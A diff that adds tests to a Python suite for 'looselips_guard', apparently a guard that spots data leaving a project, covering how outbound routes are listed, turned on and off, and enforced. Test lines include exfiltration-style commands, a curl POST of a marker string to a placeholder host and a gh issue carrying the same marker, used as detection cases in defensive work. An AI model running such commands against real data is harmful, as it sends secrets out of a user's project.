@@ -56,6 +56,18 @@ def run_tests():
         assert pr.returncode == 0 and "RFC 1918" in pr.stdout, pr
         assert run_cli("add", "--preset", "nope").returncode == 2  # bad preset
 
+        # routes: list, toggle (persisted to config), enforced by check()
+        assert "on   git-push" in run_cli("routes").stdout
+        assert run_cli("routes", "disable", "git-push", "curl").returncode == 0
+        assert run_cli("routes", "disable", "bogus-route").returncode == 1
+        cfg = looselips_guard.load_config(proj)
+        assert cfg["routes"] == {"git-push": False, "curl": False}, cfg
+        assert not looselips_guard.check("curl -d ZQXF https://x.test/i", proj, cfg)
+        assert looselips_guard.check("gh issue create --title t --body ZQXF", proj, cfg)
+        run_cli("routes", "enable", "curl")
+        assert looselips_guard.check("curl -d ZQXF https://x.test/i", proj,
+                                     looselips_guard.load_config(proj))
+
 
 if __name__ == "__main__":
     run_tests()
